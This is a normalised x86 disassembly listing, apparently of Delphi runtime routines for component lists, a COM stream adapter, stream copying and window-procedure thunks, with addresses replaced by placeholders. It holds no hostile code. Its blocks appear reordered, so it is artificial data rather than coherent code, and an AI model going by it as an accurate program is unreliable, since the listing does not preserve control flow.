retn
sub_4193f0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_4195a8
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_41943c
push ebx
push esi
push ecx
call sub_403598
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_419690
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_419638
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_413e90
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_419600
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_403580
lea eax [ ebx + 0x14 ]
call sub_40ccd0
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_413918
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_4194c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413974
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4137bc
mov edx ebx
mov eax esi
call sub_4194c0
sub_419554
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4137bc
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0x10 ] eax
sub_419580
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_413a5c
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403224
xor eax eax
mov [ ebx + 0x10 ] eax
sub_4195a8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403420
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_419554
mov dl 0x1
mov eax ebx
call sub_419ac8
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_419a78
sub_419600
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_419ac8
mov edx ebx
mov eax esi
call sub_419580
pop edi
pop esi
pop ebx
retn
sub_419638
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_413a00
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_419600
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_419580
sub_419690
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_413918
call sub_419690
inc edi
dec esi
jne r-xdata
sub_4196cc
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_413a5c
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403224
xor eax eax
mov [ ebx + 0x14 ] eax
sub_4196f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4196cc
mov edx ebx
mov eax esi
call sub_4196cc
pop esi
pop ebx
retn
sub_41970c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_4196f0
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413918
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_419768
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_419514
push ebx
push sub_41953c
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_419528
push ebx
push sub_419548
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_419860
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407b60
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_4198f8
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e8
call sub_403998
sub_4198f8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_413918
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407b60
test al al
jne r-xdata
sub_419948
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_404368
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407de4
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e8
call sub_403998
xor edx edx
mov eax ebx
call sub_419ac8
mov edx esi
mov eax ebx
call sub_4199d4
mov dl 0x1
mov eax ebx
call sub_419ac8
sub_4199e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413918
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4138a4
sub_419a24
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_413974
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413808
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_413994
sub_419a78
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_419a14
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_4199e8
mov cl 0x1
mov edx ebx
call sub_419a78
inc edi
dec ebp
jne r-xdata
sub_419ac8
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_4041f8
mov edx esp
mov eax esi
call sub_4034e0
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_419b10
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_419b38
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_419b80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032d8
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_419be0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_419c04
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031f4
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_419c4c
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
mov edx esi
call sub_419e7c
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_419cb4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_419e7c
mov edx ebx
mov eax esi
call sub_419e70
sub_419cf8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4193f0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_419d3c
push ebx
push esi
push edi
call sub_403598
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41943c
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_4196f0
jmp r-xdata
mov eax esi
call sub_413a00
mov edx eax
mov eax edi
call sub_419e7c
lea eax [ edi + 0x50 ]
call sub_40ccd0
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403580
sub_419d9c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41970c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_419dc8
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_419de4
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_419e00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_413918
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_419e7c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413808
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413918
cmp ebp eax
jne r-xdata
sub_419ebc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_4196f0
mov edx ebx
call sub_4194c0
sub_419ee8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031f4
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_419f30
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403224
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_419f68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_419fb7
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419fd0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41a01f
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a038
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a0a2
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41a0bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a105
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_415714
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41a120
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_40560c
xor eax eax
push ebp
push sub_41a30d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41a2e6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026bc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41a2d5
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a314
lea eax [ ebp + 0xc ]
call sub_405598
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41a350
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41a3b3
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a3e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_413c84
mov edi eax
xor eax eax
push ebp
push sub_41a439
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a440
mov eax [ rw-data ]
call sub_413ce8
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413918
call sub_403224
inc esi
dec ebx
jne r-xdata
sub_41a458
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41a480
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028b8
mov edx sub_41a458
lea eax [ esi + 0x5 ]
call sub_41a478
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41a478
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41a53c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_4068bc
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a480
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41a5f0
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41a518
sub_41a618
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41a6bc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a6c3
retn
mov eax [ rw-data ]
call sub_413108
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41a3e4
xor edx edx
xor eax eax
call sub_416614
mov eax rw-data
call sub_40ccd0
